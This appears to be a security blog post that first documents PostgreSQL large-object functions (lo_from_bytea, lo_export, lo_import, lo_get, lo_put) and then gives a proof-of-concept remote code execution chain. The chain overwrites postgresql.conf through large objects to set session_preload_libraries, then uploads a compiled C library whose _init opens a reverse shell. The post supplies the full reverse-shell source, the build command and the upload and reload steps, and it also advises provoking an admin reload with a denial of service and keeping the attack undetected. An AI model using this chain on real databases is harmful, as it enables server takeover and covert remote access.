---
layout: post
comments: false
categories: Works
---

## Background

---

### Large Object

A large object is a special type of data that provides stream-style access to data that is too large to be manipulated as a whole.
Each large object is stored as a separate object in the `pg_largeobject` system catalog, independent of the main table.

- Privileges

If updating an existing large object (by providing its `lobj_oid`), the user must have the necessary `SELECT` and `UPDATE` privileges for the large object.

### lo_from_bytea

The function `lo_from_bytea()` is used to create a large object (LOB) from a binary data value stored in a `BYTEA` column.

- Syntax

```sql
lo_from_bytea(lobj_oid oid, data bytea) RETURNS oid
```

If `loid` is `0` then an OID will be automatically allocated, otherwise the provided OID will be used.

- Usage

```sql
-- Create a new large object from a BYTEA value
SELECT lo_from_bytea(0, '\x48656c6c6f20576f726c64'); -- "Hello World" in hexadecimal

SELECT * FROM pg_largeobject;
 loid  | pageno |             data             
-------+--------+------------------------------
 12345 |      0 | \x48656c6c6f20576f726c64

-- Update an existing large object (with OID 12345)
SELECT lo_from_bytea(12345, '\x4e65772044617461'); -- "New Data" in hexadecimal
```

## lo_export

The `lo_export` function is used to export the contents of a large object to a file on the server's filesystem.

- Syntax

```sql
SELECT lo_export(oid, filename);
```

- Usage

```sql
SELECT lo_export(12345, '/tmp/exported_file.bin');
```

Data in Large Object 12345 will be written on “/tmp/exported_file.bin”

### lo_import

The `lo_import` function in PostgreSQL is used to import a file from the server's filesystem into the database as a large object (LOB). 

- Syntax

```sql
SELECT lo_import(filename);
SELECT lo_import(filename, oid);
```

If oid is omitted, PostgreSQL will assign a new OID automatically.

- Usage

```sql
SELECT lo_import('/tmp/example_file.bin', 12345);
```

This imports the file `/tmp/example_file.bin` and assigns it the OID `12345`.

### lo_get

The `lo_get` function is for extracting data from a large object.

- Syntax

```sql
SELECT lo_get ( loid oid [, offset bigint, length integer ] ) RETURNS bytea
```

- Usage

```sql
SELECT lo_get(12345);
            lo_get            
------------------------------
 \x48656c6c6f20576f726c64         -- "Hello World" in hexadecimal
(1 row)
```

Bring the data in large object 12345

### lo_put

The `lo_put` function is for writing data to a large object.

- Syntax

```sql
lo_put ( loid oid, offset bigint, data bytea )
```

Data will be added at the given offset within the large object.

- Usage

```sql
SELECT lo_put(12345, 6, '\x4561727468');
 lo_put 
--------
 
(1 row)

SELECT *, encode(data, 'escape') FROM pg_largeobject WHERE loid = 16394;
 loid  | pageno |             data             |    encode    
-------+--------+------------------------------+--------------
 12345 |      0 | \x48656c6c6f204561727468     | Hello Earth
       |        |                              | 
(1 row)
```

## PoC

The `session_preload_libraries` configuration parameter in PostgreSQL is used to specify a list of shared libraries that should be loaded automatically whenever a new session starts.

So when we add malicious shared library in server’s file system and edit `session_preload_libraries` as path of malicious shared library, postgreSQL will execute a `init` function in the library. This means attacker can trigger RCE with controlling `session_preload_libraries`.

### Version

First check the postgreSQL version with following command:

```sql
SELECT version();
```

### Fake postgresql.conf

```yaml
 # - Connection Settings -
 listen_addresses = '*'
    
 # - Memory -
 shared_buffers = 128MB
 dynamic_shared_memory_type = posix

 # - Checkpoints -
 max_wal_size = 1GB
 min_wal_size = 80MB

 # - What to Log -
 log_timezone = 'Etc/UTC'
    
 # - Locale and Formatting -
 datestyle = 'iso, mdy'
 timezone = 'Etc/UTC'

 # These settings are initialized by initdb, but they can be changed.
 lc_messages = 'en_US.utf8'
 lc_monetary = 'en_US.utf8'
 lc_numeric = 'en_US.utf8'
 lc_time = 'en_US.utf8'
    
 # default configuration for text search
 default_text_search_config = 'pg_catalog.english'
    
 dynamic_library_path = '/tmp:$libdir'
 session_preload_libraries = '/tmp/payload.so'
```

I made a fake config file. In the file, I changed path of `session_preload_libraries` as `/tmp/payload.so`. Later I will upload malicious shared library in `/tmp/payload.so` .

```sql
SELECT lo_from_bytea(1234566, decode('ICMgLSBDb25uZWN0aW9uIFNldHRpbmdzIC0KIGxpc3Rlbl9hZGRyZXNzZXMgPSAnKicKIG1heF9jb25uZWN0aW9ucyA9IDEwMAogICAgCiAjIC0gTWVtb3J5IC0KIHNoYXJlZF9idWZmZXJzID0gMTI4TUIKIGR5bmFtaWNfc2hhcmVkX21lbW9yeV90eXBlID0gcG9zaXgKICAgIAogIyAtIENoZWNrcG9pbnRzIC0KIG1heF93YWxfc2l6ZSA9IDFHQgogbWluX3dhbF9zaXplID0gODBNQgogICAgCiAjIC0gV2hhdCB0byBMb2cgLQogbG9nX3RpbWV6b25lID0gJ0V0Yy9VVEMnCiAgICAKICMgLSBMb2NhbGUgYW5kIEZvcm1hdHRpbmcgLQogZGF0ZXN0eWxlID0gJ2lzbywgbWR5JwogdGltZXpvbmUgPSAnRXRjL1VUQycKICAgIAogIyBUaGVzZSBzZXR0aW5ncyBhcmUgaW5pdGlhbGl6ZWQgYnkgaW5pdGRiLCBidXQgdGhleSBjYW4gYmUgY2hhbmdlZC4KIGxjX21lc3NhZ2VzID0gJ2VuX1VTLnV0ZjgnCiBsY19tb25ldGFyeSA9ICdlbl9VUy51dGY4JwogbGNfbnVtZXJpYyA9ICdlbl9VUy51dGY4JwogbGNfdGltZSA9ICdlbl9VUy51dGY4JwogICAgCiAjIGRlZmF1bHQgY29uZmlndXJhdGlvbiBmb3IgdGV4dCBzZWFyY2gKIGRlZmF1bHRfdGV4dF9zZWFyY2hfY29uZmlnID0gJ3BnX2NhdGFsb2cuZW5nbGlzaCcKICAgIAogZHluYW1pY19saWJyYXJ5X3BhdGggPSAnL3RtcDokbGliZGlyJwogc2Vzc2lvbl9wcmVsb2FkX2xpYnJhcmllcyA9ICcvdG1wL3N0b2NrLnNvJw==', 'base64'));
SELECT lo_export(1234566, '/var/lib/postgresql/data/postgresql.conf');
```

Encode the fake configuration into a base64 string and overwrite the existing configuration using a large object.

Additionally, admin can change conf file path via `-c` . In this case, we can read path of conf file with pg_file_settings.

```sql
SELECT sourcefile FROM pg_file_settings;
```

### Malicious Shared Library

```c
// payload.c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
    int port = 8888;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("your_IP_addr");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}
```

I made payload.c that contain reverse shell payload in `init()` function. 

I add`PG_MODULE_MAGIC` in the code that is a macro used in C-language extensions to ensure compatibility between the compiled extension and the PostgreSQL server it is being loaded into.

I compiled the code and made shared library `payload.so` with following command line:

```bash
# compile
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -fno-stack-protector -o payload.so payload.c
```

 The next step is to upload this binary using a large object. To upload to large object, I split the lib into base64 encoded chunks.

And I sequentially inserted each chunk into a large object.

I uploaded the first chunk of the .so lib in a new lo object.

```sql
SELECT lo_from_bytea(133301, decode('f0VMRgIBAQAAAAA...=', 'base64'));
```

Then uploaded the other chunks by using the `lo_put` .

```sql
SELECT lo_put(133301, 2048*n, decode('AAA...=', 'base64'));
```

After moving whole .so lib file to large object, export the file to `/tmp/payload.so` 

```sql
SELECT lo_export(133301, '/tmp/payload.so');
```

### Reload_conf

I need to reload because the changed config file is not applied.

`pg_reload_conf` function supports applying new config file to the postgreSQL system.

```sql
SELECT pg_reload_conf();
```

After reloading, When a query comes in, the init() function of the payload.so file will be executed.

But there is big problem in this scenario.

`pg_reload_conf` is only allowed for superuser level. If the attacker have superuser Privilege, the attacker can trigger rce right away, but if not, the attacker have to wait for admin to reload the system. The attacker can trigger a DoS attack using `pg_sleep` or recursive function calls. Such actions may prompt the admin to reload the system.

Additionally, I discovered something interesting. Triggering RCE through a flawless configuration file makes PostgreSQL unusable. However, loading a malicious shared library via a configuration file with errors allows PostgreSQL to remain functional. This method enables RCE to be executed without detection by the victim.